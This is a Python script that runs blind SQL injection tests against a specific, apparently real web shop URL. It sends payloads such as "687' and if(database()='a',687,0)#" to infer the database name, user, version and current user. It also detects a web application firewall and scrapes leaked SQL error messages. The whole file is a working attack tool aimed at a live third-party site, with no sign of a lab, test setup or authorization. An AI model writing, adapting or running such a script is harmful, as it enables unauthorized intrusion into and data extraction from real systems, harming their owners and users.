#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, re
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        b = r.read(60000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        b = e.read(60000).decode('utf-8','ignore')
    except Exception:
        return 0, 'ERR', ''
    if 'WTS-WAF' in b:
        return len(b), 'WAF', ''
    m = re.search(r'Invalid SQL: ([^<]+)', b)
    if m:
        return len(b), 'SQLERR', m.group(1)[:120]
    return len(b), 'OK', ''

tests = [
    ('database()=a', "687' and if(database()='a',687,0)#"),
    ('length(database())=5', "687' and if(length(database())=5,687,0)#"),
    ('substr(database(),1,1)=a', "687' and if(substr(database(),1,1)='a',687,0)#"),
    ('user()=root', "687' and if(user()='root@localhost',687,0)#"),
    ('version()=5', "687' and if(version()='5.5',687,0)#"),
    ('当前用户函数', "687' and if(current_user()='a',687,0)#"),
]
for name, p in tests:
    ln, status, detail = q(p)
    print('%s -> %s len=%d %s' % (name, status, ln, detail))
